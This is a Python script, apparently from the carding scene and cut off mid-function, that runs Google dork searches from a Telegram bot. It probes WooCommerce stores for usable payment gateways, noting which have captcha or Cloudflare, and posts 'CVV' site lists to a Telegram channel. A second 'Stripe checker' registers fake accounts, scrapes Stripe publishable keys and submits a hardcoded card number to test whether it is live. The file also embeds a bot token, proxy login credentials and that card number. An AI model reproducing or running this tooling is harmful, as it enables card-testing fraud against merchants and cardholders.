# GOOGLE SEARCHER
# CREATED BY pR1nc3u
# NOT FOR SALE
# Modified with Telegram Bot Control

import os
import requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import urllib.parse
import shutil
import sys
import time
import re
import threading
import json
import socket
import http.cookiejar
import tempfile
import warnings
import html
import random
import string
from urllib.parse import urlparse, urlunparse
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Try to import fake_useragent, use fallback if not available
try:
    from fake_useragent import UserAgent
    ua = UserAgent()
    def get_random_ua():
        try:
            return ua.random
        except:
            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
except ImportError:
    def get_random_ua():
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'

# Suppress urllib3 InsecureRequestWarning
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== CONFIGURATION ==========
# Get bot token from @BotFather on Telegram
BOT_TOKEN = "8298502980:AAFy3iDs_Aup9hus3tNZYmX8IvziEANz_hc"

# Get your admin ID by messaging @userinfobot on Telegram
ADMIN_ID = "6679042143"

# Default proxy (auto-parsed, format: host:port:username:password)
DEFAULT_PROXY = "gw-premium.rainproxy.io:5959:RsK8o374gc-res-any:5V4IzZgJp67sMaTn"

# Output file name
OUTPUT_FILE = "astre.json"

# Wordlist file name
WORDLIST_FILE = "wordlist.txt"

# Telegram channel ID for CVV/CCN results
CHECKER_CHAT_ID = "-5065404557"

# Flood control settings
FLOOD_CONTROL_DELAY = 1.5  # Minimum seconds between messages to same chat (1.5s = ~40 messages/minute)
last_message_time = {}  # Track last message time per chat
message_lock = threading.Lock()  # Lock for thread-safe message sending
message_queue = []  # Queue for messages if needed
queue_lock = threading.Lock()  # Lock for queue operations

# Shared state for checkers: Track sites where Stripe checker found a good site
stripe_good_sites = {}  # {base_url: True} if Stripe checker found good site
stripe_sites_lock = threading.Lock()  # Lock for thread-safe access
# ===================================

# ANSI escape codes for text colors
GREEN = "\033[32m"
YELLOW = "\033[33m"
RED = "\033[31m"
CYAN = "\033[36m"
RESET = "\033[0m"

# Global variables
dork = ""
processing_active = False
processing_thread = None
json_file_lock = threading.Lock()  # Lock for JSON file operations

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def remove_duplicate_lines(filename):
    """Remove duplicate lines from text file"""
    if os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
            lines = file.readlines()
        lines = list(dict.fromkeys(lines))
        with open(filename, 'w', encoding='utf-8') as file:
            file.writelines(lines)

def remove_duplicate_json_urls(filename):
    """Remove duplicate URLs from text file (one URL per line)"""
    global json_file_lock
    if os.path.exists(filename):
        with json_file_lock:
            try:
                # Read all lines
                urls = []
                with open(filename, 'r', encoding='utf-8') as file:
                    for line in file:
                        line = line.strip()
                        if line:
                            urls.append(line)
                
                # Remove duplicates while preserving order
                urls = list(dict.fromkeys(urls))
                
                # Write back (one URL per line, no JSON format)
                with open(filename, 'w', encoding='utf-8') as file:
                    for url in urls:
                        file.write(url + '\n')
            except Exception:
                # If file is corrupted, initialize as empty file
                with open(filename, 'w', encoding='utf-8') as file:
                    pass

def get_base_url_from_full(url):
    """Extract base URL from full URL"""
    url = url.strip()
    if not url:
        return ''
    if not re.match(r'^https?://', url):
        url = 'https://' + url
    try:
        parsed = urlparse(url)
        if parsed.hostname:
            scheme = parsed.scheme or 'https'
            return f"{scheme}://{parsed.hostname}"
    except Exception:
        pass
    return url

def append_urls_to_json(filename, urls_to_add):
    """Thread-safe function to append base URLs to text file (one per line)"""
    global json_file_lock
    if not urls_to_add:
        return
    
    # Use global file lock for thread safety
    with json_file_lock:
        # Read existing URLs
        existing_urls = set()
        if os.path.exists(filename):
            try:
                with open(filename, 'r', encoding='utf-8') as file:
                    for line in file:
                        line = line.strip()
                        if line:
                            existing_urls.add(line)
            except Exception:
                pass
        
        # Extract base URLs from new URLs
        base_urls_to_add = []
        for url in urls_to_add:
            base_url = get_base_url_from_full(url)
            if base_url and base_url not in existing_urls:
                base_urls_to_add.append(base_url)
                existing_urls.add(base_url)
        
        # Append new base URLs to file (one per line, no JSON format)
        if base_urls_to_add:
            with open(filename, 'a', encoding='utf-8') as file:
                for base_url in base_urls_to_add:
                    file.write(base_url + '\n')

def initialize_json_file(filename):
    """Initialize text file as empty if it doesn't exist"""
    if not os.path.exists(filename):
        with open(filename, 'w', encoding='utf-8') as file:
            pass  # Create empty file

def remove_file(file_path):
    if os.path.exists(file_path):
        os.remove(file_path)

def parse_proxy(proxy_string):
    """Parse proxy string in format: host:port:username:password"""
    try:
        # Split by colon
        parts = proxy_string.split(':')
        if len(parts) >= 4:
            # Find port (4-5 digits)
            port = None
            port_index = None
            for i, part in enumerate(parts):
                if part.isdigit() and (len(part) == 4 or len(part) == 5):
                    port = part
                    port_index = i
                    break
            
            if port and port_index and port_index + 2 < len(parts):
                # Host is everything before port
                host = ':'.join(parts[:port_index])
                # Username is right after port
                username = parts[port_index + 1]
                # Password is everything after username (in case password contains colons)
                password = ':'.join(parts[port_index + 2:])
                return host, port, username, password
        return None, None, None, None
    except Exception as e:
        print(f"Error parsing proxy: {e}")
        return None, None, None, None

def setup_proxy():
    """Setup proxy configuration"""
    proxy_host, proxy_port, proxy_user, proxy_pass = parse_proxy(DEFAULT_PROXY)
    if proxy_host and proxy_port and proxy_user and proxy_pass:
        proxy_url = f"{proxy_host}:{proxy_port}"
        proxy_auth = f"{proxy_user}:{proxy_pass}"
        return proxy_url, proxy_auth
    return None, None

def send_telegram_message(chat_id, text, parse_mode=None, max_retries=5):
    """Send message via Telegram with flood control - ensures message is sent with delays, never skipped"""
    global last_message_time
    
    chat_id_str = str(chat_id)
    
    # Retry loop to ensure message is sent (never skip, just delay)
    for attempt in range(max_retries):
        current_time = time.time()
        
        with message_lock:
            # Check last message time for this chat
            if chat_id_str in last_message_time:
                time_since_last = current_time - last_message_time[chat_id_str]
                if time_since_last < FLOOD_CONTROL_DELAY:
                    # Wait to avoid flood control (this ensures we don't skip, just delay)
                    wait_time = FLOOD_CONTROL_DELAY - time_since_last
                    time.sleep(wait_time)
                    current_time = time.time()  # Update time after waiting
            
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                data = {"chat_id": chat_id, "text": text}
                if parse_mode:
                    data["parse_mode"] = parse_mode
                
                response = requests.post(url, data=data, timeout=10)
                
                # Update last message time
                last_message_time[chat_id_str] = time.time()
                
                # Check for flood control error (429 Too Many Requests)
                if response.status_code == 429:
                    try:
                        error_data = response.json()
                        retry_after = error_data.get('parameters', {}).get('retry_after', 60)
                        print(f"⚠️ Rate limited! Waiting {retry_after} seconds before retry (attempt {attempt + 1}/{max_retries})...")
                        time.sleep(retry_after)
                        
                        # Continue to retry (don't skip message)
                        if attempt < max_retries - 1:
                            continue  # Retry after waiting
                        else:
                            # Last attempt - try one more time
                            response = requests.post(url, data=data, timeout=10)
                            last_message_time[chat_id_str] = time.time()
                            
                            if response.status_code == 200:
                                return True
                            else:
                                print(f"⚠️ Final retry failed with status {response.status_code}")
                                # Still retry one more time after longer wait
                                time.sleep(10)
                                response = requests.post(url, data=data, timeout=10)
                                return response.status_code == 200
                    except Exception as e:
                        print(f"⚠️ Error handling rate limit: {e}")
                        if attempt < max_retries - 1:
                            time.sleep(5)  # Wait before retry
                            continue
                        # Final attempt
                        time.sleep(10)
                        try:
                            response = requests.post(url, data=data, timeout=10)
                            return response.status_code == 200
                        except:
                            return False
                
                if response.status_code == 200:
                    return True
                else:
                    print(f"⚠️ Telegram API error: {response.status_code} (attempt {attempt + 1}/{max_retries})")
                    if attempt < max_retries - 1:
                        time.sleep(2)  # Wait before retry
                        continue
                    # Final attempt
                    time.sleep(5)
                    try:
                        response = requests.post(url, data=data, timeout=10)
                        return response.status_code == 200
                    except:
                        return False
                    
            except requests.exceptions.RequestException as e:
                print(f"⚠️ Network error: {e} (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(2)  # Wait before retry
                    continue
                # Final attempt
                time.sleep(5)
                try:
                    response = requests.post(url, data=data, timeout=10)
                    return response.status_code == 200
                except:
                    return False
            except Exception as e:
                print(f"⚠️ Error: {e} (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(2)  # Wait before retry
                    continue
                return False
    
    # If all retries failed, try one final time after longer wait
    print(f"⚠️ All retries exhausted, final attempt after 10 second wait...")
    time.sleep(10)
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        if parse_mode:
            data["parse_mode"] = parse_mode
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except:
        return False

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    await update.message.reply_text("👋 Please send the dork key")

async def handle_dork(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle dork input from user"""
    global dork, processing_active
    
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    if processing_active:
        await update.message.reply_text("⏳ Processing is already active. Please wait for it to complete.")
        return
    
    dork = update.message.text.strip()
    
    if not dork:
        await update.message.reply_text("❌ Dork cannot be empty. Please send a valid dork.")
        return
    
    # Save dork to file
    dork_file = "./data/dork.txt"
    os.makedirs("data", exist_ok=True)
    with open(dork_file, 'w', encoding='utf-8') as f:
        f.write(dork)
    
    await update.message.reply_text(f"✅ Dork received!\n\n📝 Dork: {dork[:100]}...\n\n🚀 Starting processing...")
    
    # Start processing in background thread
    processing_active = True
    thread = threading.Thread(target=start_processing_thread, args=(update.message.chat_id,))
    thread.daemon = True
    thread.start()

def start_processing_thread(chat_id):
    """Start processing in a separate thread"""
    global processing_active
    
    try:
        send_telegram_message(chat_id, "🔄 Processing started...")
        start_processing(chat_id)
        send_telegram_message(chat_id, "✅ Processing completed successfully!")
    except Exception as e:
        send_telegram_message(chat_id, f"❌ Error during processing: {str(e)}")
    finally:
        processing_active = False

def get_links(value, proxy_url, proxy_auth):
    """Get links from Google search"""
    global dork
    
    proxies = {
        'http': f'http://{proxy_url}',
        'https': f'http://{proxy_url}'
    }
    auth = requests.auth.HTTPProxyAuth(*proxy_auth.split(':'))
    query = f"{dork} {value}"
    google_search_url = f"http://www.google.com/search?q={urllib.parse.quote(query)}&num=100"
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36'}
    
    try:
        response = requests.get(google_search_url, proxies=proxies, auth=auth, timeout=15)
        status_code = response.status_code

        if status_code != 200:
            return None, f"Error Code: {status_code}"
        
        soup = BeautifulSoup(response.content, 'html.parser')
        links = soup.find_all('a')
        
        urls = []
        for link in links:
            href = link.get('href')
            if href and href.startswith('/url?q=') and 'webcache' not in href:
                actual_url = href.split('?q=')[1].split('&sa=U')[0]
                if 'google.com' not in actual_url and not actual_url.startswith('/search'):
                    urls.append(actual_url)
        
        return urls, None
    except requests.exceptions.RequestException as e:
        return None, str(e)

def read_wordlist(wordlist_file):
    """Read wordlist from file"""
    if not os.path.exists(wordlist_file):
        return []
    
    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as file:
        words = [line.strip() for line in file.readlines() if line.strip()]
    return words

def save_line_number(line_number, counter_file):
    """Save current line number"""
    with open(counter_file, 'w') as file:
        file.write(str(line_number))

def save_err_link(url, error_file):
    """Save error link"""
    with open(error_file, 'a', encoding='utf-8') as file:
        file.write(url + '\n')

# ========== SITE CHECKER FUNCTIONS ==========
def get_base_url_checker(url):
    """Extract base URL from full URL"""
    url = url.strip()
    if not url:
        return ''
    if not re.match(r'^https?://', url):
        url = 'https://' + url
    try:
        parsed = urlparse(url)
        if parsed.hostname:
            scheme = parsed.scheme or 'https'
            return f"{scheme}://{parsed.hostname}"
    except Exception:
        pass
    return url

def setup_checker_proxy(proxy_port, user_pass):
    """Setup proxy for checker requests"""
    if proxy_port:
        if user_pass:
            proxy_url = f"http://{user_pass}@{proxy_port}"
        else:
            proxy_url = f"http://{proxy_port}"
        return {'http': proxy_url, 'https': proxy_url}
    return None

def fetch_current_ip_checker(proxy_port='', user_pass=''):
    """Fetch current IP address"""
    try:
        url = 'https://ip.zxq.co/'
        proxies = setup_checker_proxy(proxy_port, user_pass)
        response = requests.get(url, proxies=proxies, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            if 'ip' in data:
                ip = data['ip']
                parts = ip.split('.')
                if len(parts) >= 4:
                    parts[2] = 'xxx'
                    parts[3] = 'xx'
                return '.'.join(parts)
    except Exception:
        pass
    return False

def extract_between_checker(text, start, end):
    """Extract text between two strings"""
    try:
        idx = text.index(start)
        text = text[idx + len(start):]
        idx = text.index(end)
        return text[:idx]
    except ValueError:
        return None

def get_geolocation_checker(domain):
    """Get country code from domain"""
    try:
        ip = socket.gethostbyname(domain)
        if ip == domain or not ip:
            return "Unknown"
        url = f"http://ip-api.com/json/{ip}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data.get('countryCode', 'Unknown')
    except Exception:
        pass
    return "Unknown"

def detect_captcha_checker(html_content):
    """Detect CAPTCHA in HTML content"""
    captcha_keywords = ['sitekey', 'data-sitekey', 'recaptcha', 'g-recaptcha', 'hcaptcha', 'captcha']
    html_lower = html_content.lower()
    for keyword in captcha_keywords:
        if keyword.lower() in html_lower:
            return True
    return False

def detect_cloudflare_checker(html_content):
    """Detect Cloudflare protection in HTML content"""
    cloudflare_keywords = ['cloudflare', 'cf-challenge', 'cf-bm', 'cf-ray', 'cf-captcha']
    html_lower = html_content.lower()
    for keyword in cloudflare_keywords:
        if keyword.lower() in html_lower:
            return True
    return False

def fetch_url_checker(url, cookie_file, is_post=False, post_data=None, retry_count_ref=None, proxy_port='', user_pass=''):
    """Fetch URL with retries"""
    retry = 3
    proxies = setup_checker_proxy(proxy_port, user_pass)
    
    while retry > 0:
        if retry_count_ref is not None:
            retry_count_ref[0] += 1
        
        try:
            session = requests.Session()
            if os.path.exists(cookie_file):
                try:
                    jar = http.cookiejar.MozillaCookieJar(cookie_file)
                    jar.load(ignore_discard=True, ignore_expires=True)
                    session.cookies = jar
                except Exception:
                    pass
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
            }
            
            if is_post:
                response = session.post(url, data=post_data, headers=headers, proxies=proxies, timeout=15, allow_redirects=True, verify=False)
            else:
                response = session.get(url, headers=headers, proxies=proxies, timeout=15, allow_redirects=True, verify=False)
            
            try:
                jar = http.cookiejar.MozillaCookieJar(cookie_file)
                for cookie in session.cookies:
                    jar.set_cookie(cookie)
                jar.save(ignore_discard=True, ignore_expires=True)
            except Exception:
                pass
            
            if response.status_code == 200 and response.text:
                return response.text
        except Exception:
            pass
        
        retry -= 1
        time.sleep(0.5)
    
    return None

def check_site_and_send(url, telegram_token, chat_id, proxy_port='', user_pass=''):
    """Check a single site and send result to Telegram"""
    base_url = get_base_url_checker(url)
    if not base_url:
        return False
    
    try:
        parsed = urlparse(base_url)
        domain = parsed.hostname
        scheme = parsed.scheme or 'https'
        if not domain:
            return False
    except Exception:
        return False
    
    start_time = time.time()
    cookie_jar = tempfile.NamedTemporaryFile(delete=False, prefix='cookie', suffix='.txt')
    cookie_file = cookie_jar.name
    cookie_jar.close()
    
    try:
        os.unlink(cookie_file)
    except Exception:
        pass
    
    retry_count = [0]
    ip = fetch_current_ip_checker(proxy_port, user_pass)
    if ip is False:
        ip = "xxx.xxx.xxx.xx"
    
    # Use base_url consistently to ensure we check and send the same site
    # 1. Get product page
    product_page = fetch_url_checker(f"{base_url}/?s=&post_type=product", cookie_file, False, None, retry_count, proxy_port, user_pass)
    if not product_page:
        product_page = fetch_url_checker(f"{base_url}/shop/", cookie_file, False, None, retry_count, proxy_port, user_pass)
    if not product_page:
        try:
            os.unlink(cookie_file)
        except Exception:
            pass
        return False
    
    # 2. Extract product ID
    add_to_cart_id = extract_between_checker(product_page, '<a href="?add-to-cart=', '"')
    if not add_to_cart_id:
        add_to_cart_id = extract_between_checker(product_page, 'data-product_id="', '"')
    if not add_to_cart_id:
        add_to_cart_id = extract_between_checker(product_page, 'add-to-cart=', '"')
    if not add_to_cart_id:
        match = re.search(r'add-to-cart[=:]([0-9]+)', product_page, re.IGNORECASE)
        if match:
            add_to_cart_id = match.group(1)
    if not add_to_cart_id:
        try:
            os.unlink(cookie_file)
        except Exception:
            pass
        return False
    
    # 3. Add to cart
    add_to_cart_response = fetch_url_checker(f"{base_url}/?add-to-cart={add_to_cart_id}", cookie_file, True, {'quantity': 1}, retry_count, proxy_port, user_pass)
    if not add_to_cart_response:
        try:
            os.unlink(cookie_file)
        except Exception:
            pass
        return False
    
    # 4. Checkout
    checkout_page = fetch_url_checker(f"{base_url}/checkout/", cookie_file, False, None, retry_count, proxy_port, user_pass)
    if not checkout_page:
        try:
            os.unlink(cookie_file)
        except Exception:
            pass
        return False
    
    # 5. Extract payment methods
    matches = re.findall(r'type="radio" class="input-radio" name="payment_method" value="(.*?)"', checkout_page)
    if not matches:
        matches = re.findall(r'name="payment_method" value="(.*?)"', checkout_page)
    if not matches:
        try:
            os.unlink(cookie_file)
        except Exception:
            pass
        return False
    
    payment_methods_array = matches
    has_captcha = detect_captcha_checker(checkout_page)
    has_cloudflare = detect_cloudflare_checker(checkout_page)
    execution_time = round(time.time() - start_time, 2)
    captcha_status = "YES" if has_captcha else "NO"
    cloudflare_status = "YES" if has_cloudflare else "NO"
    payment_list = ",".join(payment_methods_array)
    
    # Don't send if CAPTCHA is detected
    if has_captcha:
        try:
            os.unlink(cookie_file)
        except Exception:
            pass
        return True  # Return True but don't send message
    
    result_type = "CVV"  # Only send CVV (no CAPTCHA)
    telegram_message = f"{result_type} <code>{base_url}</code>\n"
    telegram_message += f"PAYMENT METHOD 💵:[{payment_list}]\n"
    telegram_message += f"COUNTRY 🌎:{get_geolocation_checker(domain)}\n"
    telegram_message += f"CAPTCHA 🔄:{captcha_status}\n"
    telegram_message += f"CLOUDFLARE ☁️: {cloudflare_status}\n"
    telegram_message += f"TIME 🕒: {execution_time}s\n"
    telegram_message += f"IP 🌐: {ip}"
    
    # Send message with flood control (will wait if needed, never skips)
    send_telegram_message(chat_id, telegram_message, "HTML")
    
    try:
        os.unlink(cookie_file)
    except Exception:
        pass
    
    return True

# ========== STRIPE CHECKER FUNCTIONS (Second Checker) ==========
DEFAULT_CARD = "5598880397218308|06|2027|740"

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_random_email():
    return f"{generate_random_string()}@gmail.com"

def generate_random_username():
    return f"user_{generate_random_string(8)}"

def html_escape(text):
    return html.escape(str(text)) if text else ""

def analyze_site_page_stripe(text):
    """Analyze site page for Stripe checker"""
    low = text.lower()
    
    gateways = []
    gateway_keywords = {
        "stripe": "Stripe",
        "paypal": "PayPal",
        "ppcp": "PPCP",
        "square": "Square",
        "braintree": "Braintree",
        "adyen": "Adyen",
        "paystack": "Paystack",
        "razorpay": "Razorpay",
        "2checkout": "2Checkout",
        "authorize.net": "Authorize.net",
        "worldpay": "WorldPay",
        "klarna": "Klarna",
        "afterpay": "AfterPay",
    }
    
    for key, label in gateway_keywords.items():
        if key in low:
            gateways.append(label)
    
    gateways = list(dict.fromkeys(gateways))
    
    has_captcha = any(k in low for k in ("recaptcha", "g-recaptcha", "h-captcha", "captcha"))
    has_cloudflare = any(k in low for k in ("cloudflare", "attention required", "checking your browser", "ray id"))
    has_add_to_cart = any(k in low for k in ("add-to-cart", "woocommerce-loop-product__link", "product_type_simple", "add_to_cart_button"))
    
    return {
        "gateways": gateways,
        "has_captcha": has_captcha,
        "has_cloudflare": has_cloudflare,
        "has_add_to_cart": has_add_to_cart,
    }

def find_stripe_pk(payment_url, session=None):
    """Find Stripe public key"""
    sess = session or requests.Session()
    try:
        resp = sess.get(payment_url, headers={"User-Agent": get_random_ua()}, timeout=15, verify=False)
        text = resp.text
    except Exception:
        return None
    
    for regex in (
        r'pk_(live|test)_[0-9A-Za-z_\-]{8,}',
        r'"key"\s*:\s*"(pk_live|pk_test)_[^"]+"',
        r'publishable[_-]?key["\']?\s*[:=]\s*["\'](pk_live|pk_test)_[^"\']+["\']',
    ):
        m = re.search(regex, text, re.IGNORECASE)
        if m:
            pk = re.search(r'(pk_live|pk_test)_[0-9A-Za-z_\-]+', m.group(0))
            if pk:
                return pk.group(0)
    
    return None

def interpret_gate_response(final_json):
    """Interpret gate response"""
    data = final_json or {}
    txt = str(final_json).lower() if final_json else ""
    nested = data.get("data") if isinstance(data, dict) else None
    
    if isinstance(nested, dict):
        status = (nested.get("status") or "").lower()
        if status in ("requires_action", "requires_source_action", "requires_payment_method", "requires_confirmation"):
            return "3ds", "3DS required"
        if status in ("succeeded", "complete", "completed", "processed"):
            return "success", "Card added"
    
    for key in ("setup_intent", "setupIntent", "payment_intent", "paymentIntent"):
        si = data.get(key) if isinstance(data, dict) else None
        if isinstance(si, dict):
            si_status = (si.get("status") or "").lower()
            if si_status in ("requires_action", "requires_source_action", "requires_confirmation"):
                return "3ds", "3DS required"
            if si_status in ("succeeded", "complete", "processed"):
                return "success", "Card added"
    
    if "incorrect_cvc" in txt or ("cvc" in txt and "incorrect" in txt):
        return "cvc_incorrect", "CVC incorrect"
    if any(k in txt for k in ("not support", "unsupported", "cannot be used", "not allowed")):
        return "not_supported", "Card not supported"
    if "declined" in txt:
        return "declined", "Card declined"
    if "succeeded" in txt or "completed" in txt:
        return "success", "Card added"
    return "unknown", "Unrecognized response"

def send_card_to_stripe(session, pk, card):
    """Send card to Stripe API"""
    try:
        n, mm, yy, cvc = card.strip().split("|")
    except Exception:
        return {"error": "Invalid card format"}
    
    if yy.startswith("20"):
        yy = yy[2:]
    
    headers = {"User-Agent": get_random_ua()}
    payload = {
        "type": "card",
        "card[number]": n,
        "card[cvc]": cvc,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "key": pk,
        "_stripe_version": "2024-06-20",
    }
    
    try:
        resp = session.post("https://api.stripe.com/v1/payment_methods", data=payload, headers=headers, timeout=15, verify=False)
        stripe_json = resp.json()
        if isinstance(stripe_json, dict) and stripe_json.get("error"):
            msg = stripe_json["error"].get("message", "Stripe decline")
            return {
                "status_key": "declined",
                "short_msg": f"Card declined ({msg})",
                "error_source": "stripe",
                "raw": stripe_json,
            }
    except Exception as e:
        return {"error_source": "stripe", "short_msg": f"Stripe error ({e})"}
    
    if resp.status_code >= 400:
        return {"error_source": "stripe", "short_msg": f"Stripe error ({resp.status_code})"}
    
    stripe_id = stripe_json.get("id")
    if not stripe_id:
        if "succeeded" in str(stripe_json).lower() or "status" in str(stripe_json).lower():
            return {"status_key": "success", "short_msg": "Card added (detected via status)", "error_source": "normal", "raw": stripe_json}
        return {"error_source": "stripe", "short_msg": "Stripe error (no id or invalid key)", "raw": stripe_json}
    
    # Get payment page and find nonce
    try:
        html_text = session.get(session.payment_page_url, headers={"User-Agent": get_random_ua()}, timeout=15, verify=False).text
    except Exception as e:
        return {"error_source": "site", "short_msg": f"Site error (fetch page: {e})"}
    
    nonce = None
    for pat in (r'createAndConfirmSetupIntentNonce":"([^"]+)"', r'"_ajax_nonce":"([^"]+)"', r'nonce":"([^"]+)"'):
        m = re.search(pat, html_text)
        if m:
            nonce = m.group(1)
            break
    
    if not nonce:
        return {"error_source": "site", "short_msg": "Site error (nonce missing)"}
    
    data_final = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': stripe_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }
    final_url = session.payment_page_url.rstrip('/') + '/?wc-ajax=wc_stripe_create_and_confirm_setup_intent'
    headers["Referer"] = session.payment_page_url
    
    try:
        f_resp = session.post(final_url, headers=headers, data=data_final, timeout=25, verify=False)
        final_json = f_resp.json()
    except Exception as e:
        return {"error_source": "site", "short_msg": f"Site error (bad JSON): {e}"}
    
    status_key, short_msg = interpret_gate_response(final_json)
    txt_dump = str(final_json).lower()
    
    nonsend_patterns = [
        "your request used a real card while testing", "test mode",
        "no such paymentmethod", "invalid", "missing",
        "requires_action", "requires_confirmation",
    ]
    if any(p in txt_dump for p in nonsend_patterns):
        return {"status_key": "declined", "short_msg": "Card declined (test/error)", "error_source": "stripe" if "stripe" in txt_dump else "site", "raw": final_json}
    
    if (isinstance(final_json, dict) and (final_json.get("success") is True or (final_json.get("data", {}).get("status", "").lower() == "succeeded"))) or any(k in txt_dump for k in ["card added", '"status": "succeeded"', "'status': 'succeeded'"]):
        return {"status_key": "success", "short_msg": "Card added (live site)", "error_source": "normal", "raw": final_json}
    
    if "your card was declined." in txt_dump:
        return {"status_key": "declined", "short_msg": "Card declined", "error_source": "stripe", "raw": final_json}
    
    return {"status_key": "declined", "short_msg": "Card declined (unrecognized)", "error_source": "stripe" if "stripe" in txt_dump else "site", "raw": final_json}

def check_site_stripe(url, telegram_token, chat_id, proxy_port='', user_pass=''):
    """Check site using Stripe method (second checker)"""
    base_url = get_base_url_checker(url)
    if not base_url:
        return False
    
    try:
        parsed = urlparse(base_url)
        domain = parsed.hostname
        if not domain:
            return False
    except Exception:
        return False
    
    REGISTER_URL = f"{base_url}/my-account/"
    PAYMENT_URL = f"{base_url}/my-account/add-payment-method/"
    
    try:
        session = requests.Session()
        proxies = setup_checker_proxy(proxy_port, user_pass)
        if proxies:
            session.proxies = proxies
        
        headers = {
            "User-Agent": get_random_ua(),
            "Referer": REGISTER_URL,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = {
            "email": generate_random_email(),
            "username": generate_random_username(),
            "password": generate_random_string(12),
        }
        
        reg = session.post(REGISTER_URL, headers=headers, data=data, timeout=15, allow_redirects=True, verify=False)
        if reg.status_code not in (200, 302):
            return False
        
        session.payment_page_url = PAYMENT_URL
        page_html = session.get(PAYMENT_URL, headers={"User-Agent": get_random_ua()}, timeout=15, verify=False).text
        page_info = analyze_site_page_stripe(page_html)
        
        pk_raw = find_stripe_pk(PAYMENT_URL, session)
        if not pk_raw:
            return False
        
        result = send_card_to_stripe(session, pk_raw, DEFAULT_CARD)
        
        # Skip if dead site or test mode
        result_txt = str(result).lower()
        result_raw = result.get("raw", "")
        result_str = str(result_raw).lower() if result_raw else ""
        if "unable to verify your request. please refresh the page and try again" in result_txt or "unable to verify your request. please refresh the page and try again" in result_str:
            return False
        
        if "testmode_charges_only" in result_txt:
            return False
        
        gateway = ", ".join(page_info["gateways"]) if page_info["gateways"] else "Unknown"
        captcha = "Found❌" if page_info["has_captcha"] else "Good✅"
        cloudflare = "Found❌" if page_info["has_cloudflare"] else "Good✅"
        add_to_cart = "Yes" if page_info["has_add_to_cart"] else "No"
        
        # Format message
        telegram_message = (
            f"<b>Site:</b> <code>{html_escape(base_url)}</code>\n"
            f"<b>Gateway:</b> {gateway}\n"
            f"<b>Captcha:</b> {captcha}\n"
            f"<b>Cloudflare:</b> {cloudflare}\n"
            f"<b>Add-to-cart:</b> {add_to_cart}\n"
            f"<b>PK:</b> <code>{html_escape(pk_raw)}</code>\n\n"
            f"<b>Result:</b> {html_escape(result.get('short_msg', ''))}\n"
            f"<code>{html_escape(str(result.get('raw', ''))[:400])}</code>"
        )
        
        # Stripe checker sends results even if CAPTCHA is detected
        # Send message with flood control
        send_telegram_message(chat_id, telegram_message, "HTML")
        
        # Mark this site as "good" in Stripe checker (found PK and got response)
        # This will prevent Payment Gateway Detector from running
        global stripe_good_sites, stripe_sites_lock
        with stripe_sites_lock:
            stripe_good_sites[base_url] = True
        
        return True
        
    except Exception:
        return False
# ============================================

# ========== THIRD CHECKER: PAYMENT GATEWAY DETECTOR ==========
def try_register_method1(session, register_url):
    """Registration method 1: Standard email/username/password"""
    headers = {
        "User-Agent": get_random_ua(),
        "Referer": register_url,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "email": generate_random_email(),
        "username": generate_random_username(),
        "password": generate_random_string(12),
    }
    try:
        resp = session.post(register_url, headers=headers, data=data, timeout=15, allow_redirects=True, verify=False)
        return resp.status_code in (200, 302)
    except Exception:
        return False

def try_register_method2(session, register_url):
    """Registration method 2: Email/password only"""
    headers = {
        "User-Agent": get_random_ua(),
        "Referer": register_url,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "email": generate_random_email(),
        "password": generate_random_string(12),
        "password_confirmation": generate_random_string(12),
    }
    try:
        resp = session.post(register_url, headers=headers, data=data, timeout=15, allow_redirects=True, verify=False)
        return resp.status_code in (200, 302)
    except Exception:
        return False

def try_register_method3(session, register_url):
    """Registration method 3: Email/password with first_name/last_name"""
    headers = {
        "User-Agent": get_random_ua(),
        "Referer": register_url,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "email": generate_random_email(),
        "password": generate_random_string(12),
        "first_name": generate_random_string(6),
        "last_name": generate_random_string(6),
    }
    try:
        resp = session.post(register_url, headers=headers, data=data, timeout=15, allow_redirects=True, verify=False)
        return resp.status_code in (200, 302)
    except Exception:
        return False

def try_register_method4(session, register_url):
    """Registration method 4: Email/password with display_name"""
    headers = {
        "User-Agent": get_random_ua(),
